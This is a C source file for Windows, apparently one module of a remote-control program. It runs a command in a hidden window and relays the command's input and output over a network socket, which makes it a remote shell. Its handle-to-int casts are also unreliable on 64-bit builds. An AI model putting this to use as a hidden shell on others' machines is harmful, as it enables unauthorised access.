#include <windows.h>
#include "iodirect.h"

/*!
 * @brief:			Stdio && stdout redirect
 * @author:			xbw
 * @date:			long long ago
 * @args:			command (const char*) , HANDLE& in, HANDLE& out, DWORD& pid
 * @return:		Handle of process, or null for failed
 */

static HANDLE RedirectStreamOpen(LPSTR command,PHANDLE in,PHANDLE out,DWORD*pPid)
{
    SECURITY_ATTRIBUTES SecurityAttributes;
	HANDLE ShellStdinPipe = NULL;
	HANDLE ShellStdoutPipe = NULL;
	HANDLE hRead = NULL;
	HANDLE hWrite = NULL;

    PROCESS_INFORMATION ProcessInformation;
	STARTUPINFO si;
	HANDLE ProcessHandle = NULL;
	if(command==NULL || in == NULL || out == NULL || pPid == NULL)return 0;

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;

	if ( !CreatePipe(&hRead, &ShellStdoutPipe,&SecurityAttributes, 0) ) return NULL;

	if ( !CreatePipe(&ShellStdinPipe, &hWrite,&SecurityAttributes, 0) )
	{
		CloseHandle (hRead);
		return NULL;
	}


	////////////////////////////////

	ZeroMemory(&si,sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	si.hStdInput  = ShellStdinPipe;
	si.hStdOutput = ShellStdoutPipe;

	DuplicateHandle(GetCurrentProcess(), ShellStdoutPipe,
			GetCurrentProcess(), &si.hStdError,
			DUPLICATE_SAME_ACCESS, TRUE, 0);

	if (CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL,
				&si, &ProcessInformation))
	{
		ProcessHandle = ProcessInformation.hProcess;
		CloseHandle(ProcessInformation.hThread);
		*pPid = ProcessInformation.dwProcessId;
	}
	else
	{
		CloseHandle(hRead);
		CloseHandle(hWrite);
		CloseHandle(ShellStdinPipe);
		CloseHandle(ShellStdoutPipe);
		return NULL;
	}
	CloseHandle(ShellStdinPipe);
	CloseHandle(ShellStdoutPipe);
	*in = hWrite;
	*out = hRead;
	return ProcessHandle;
}

//Peek data from output stream,send to socket
static DWORD WINAPI ReadEchoToSocket(void*p)
{
	int *tmp = (int*)p;
	HANDLE out = *(HANDLE*)&tmp[0];
	SOCKET s = *(SOCKET*)&tmp[1];
	HANDLE proc = *(HANDLE*)&tmp[2];
	DWORD t;
	char buf[IODIRECT_READBUF];
	while(PeekNamedPipe(out,buf,IODIRECT_READBUF,&t,NULL,NULL))
	{
		//Check if Proc close
		DWORD tt;
		if(!(GetExitCodeProcess(proc,&tt) && tt==STILL_ACTIVE))
		{
			break;
		}
		if(t>0)
		{
			ReadFile(out,buf,IODIRECT_READBUF,&t,NULL);
			if(socket_send(s,buf,t,0)<0)
			{
				break;
			}
		}
		else
		{
			Sleep(IODIRECT_TIMEWAIT);
			buf[0]=0;
			t=0;
		}
	}

	socket_close(s);
	return 0;
}

COMMAND_HANDLER_FUNC(ioredirect)
{
	char read_buf[IODIRECT_READBUF]={0};
	HANDLE in=NULL,out=NULL,proc=NULL;
	DWORD pid=0;
    int nread = 0;
	sscanf(command,"%s",read_buf);
	proc= RedirectStreamOpen(read_buf,&in,&out,&pid);
	if(proc==NULL)
	{
		//Redirect Stream failed
		socket_send(s,COMMAND_RETURN_FALSE,1,0);
		return 1;
	}
	socket_send(s,COMMAND_RETURN_TRUE,1,0);

	//Send Handle and socket to thread
	{
        int tmp[3];
        tmp[0] = *(int*)&out;
        tmp[1] = *(int*)&s;
        tmp[2] = *(int*)&proc;
        //Create read echo thread
        CloseHandle(CreateThread(NULL,0,ReadEchoToSocket,tmp,0,NULL));
        Sleep(IODIRECT_TIMEWAIT);
	}

	//Get remote command
	while(nread = socket_recv(s,read_buf,IODIRECT_READBUF,0),nread>0)
	{
		DWORD t;
		if(!WriteFile(in,read_buf,nread,&t,NULL))
		{
			break;
		}
	}
	//Kill Process
	TerminateProcess(proc,0);
	CloseHandle(in);
	CloseHandle(out);
	CloseHandle(proc);
	return 0;
}
